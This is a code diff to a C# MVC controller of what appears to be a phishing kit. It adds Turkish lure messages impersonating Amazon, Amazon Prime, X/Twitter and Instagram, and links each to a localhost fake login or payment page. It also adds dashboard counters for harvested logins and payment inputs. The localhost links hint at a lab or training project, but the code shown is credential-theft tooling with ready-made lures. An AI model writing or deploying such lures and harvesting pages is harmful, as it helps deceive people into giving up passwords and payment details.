@@ -47,6 +47,10 @@ namespace WebApplicationMVC2.Controllers
             var sentMailData = context.SentMailData.OrderBy(p => p.ID).FirstOrDefault();
 
             ViewBag.TotalMailCount = sentMailData.TotalEmailsSent;
+            ViewBag.AmazonLogins = sentMailData.AmazonInputs;
+            ViewBag.AmazonPayments = sentMailData.AmazonPayInputs;
+            ViewBag.InstagramLogins = sentMailData.InstagramInputs;
+            ViewBag.TwitterLogins = sentMailData.TwitterInputs;
 
             return View();
         }
@@ -84,12 +88,12 @@ namespace WebApplicationMVC2.Controllers
         {
             var templates = new List<SelectListItem>
                 {
-                    new SelectListItem { Value = "Amazon sipariş bilgileriniz teyit edilemedi. Lütfen giriş yapıp bilgilerinizi güncelleyin: LİNK", Text = "Amazon Login" },
+                    new SelectListItem { Value = "Amazon sipariş bilgileriniz teyit edilemedi. Lütfen giriş yapıp bilgilerinizi güncelleyin: https://localhost:44327/AmazonLogin/AmazonLogin", Text = "Amazon Login" },
                     new SelectListItem { Value = "Amazon Prime ayrıcalığı şu anda sadece 1,00 TL! Bu sınırlı süreli kampanyayı kaçırmamak" +
-                    " için linkten ödeme bilgilerinizi doğrulayın -Jeff Bezos: LİNK", Text = "Amazon Payment" },
-                    new SelectListItem { Value = "Bir kullanıcı sizi X'te dürttü! Cevap vermek için: LİNK", Text = "Twitter Login" },
+                    " için linkten ödeme bilgilerinizi doğrulayın -Jeff Bezos: https://localhost:44327/AmazonPayment/AmazonPayment", Text = "Amazon Payment" },
+                    new SelectListItem { Value = "Bir kullanıcı sizi X'te dürttü! Cevap vermek için: https://localhost:44327/Twitter/Twitter", Text = "Twitter Login" },
                     new SelectListItem { Value = "Dikkat! birisi size ait olan instagram hesabına erişmeye çalışıyor olabilir." +
-                    " lütfen güvenliğiniz için giriş yapın ve şifrenizi güncelleyin.: LİNK ", Text = "Instagram Login" }
+                    " lütfen güvenliğiniz için giriş yapın ve şifrenizi güncelleyin.: https://localhost:44327/Instagram/Instagram", Text = "Instagram Login" }
                 };
             return templates;
         }
